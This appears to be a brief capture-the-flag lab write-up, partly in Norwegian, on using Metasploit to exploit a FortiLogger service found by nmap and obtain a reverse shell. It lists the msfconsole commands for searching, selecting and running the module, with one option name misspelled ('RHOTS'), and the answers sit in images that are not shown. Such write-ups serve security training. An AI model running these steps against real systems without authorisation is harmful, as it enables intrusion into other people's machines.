# Meteperter

## Find the existing exploit in MSF and use it to get a shell on the target. What is the username of the user you obtained a shell with?

For å løse denne gjør jeg en rask nmap scan på domenet. Jeg finner prosessen jeg kan exploite, som er "Fortilogger"
<br>

Start metasploit med `msfconsole -q`

<br>

`search fortilogger`

<br>

`use 0`

<br>

`set RHOTS *ip*`

<br>

`set LHOST tun0`

<br>

`run`

<br>

![picture1](https://user-images.githubusercontent.com/83395536/194724526-3ab048e5-345d-493a-9a4b-5a5f0b61d166.png)
<br>

Spørsmål
![hack3](https://user-images.githubusercontent.com/83395536/194724534-4c0c569a-65c7-430c-b289-9a2c12f39181.png)
<br>
![hack2](https://user-images.githubusercontent.com/83395536/194724535-dc59360b-0745-4899-9e90-252eeff910e7.png)

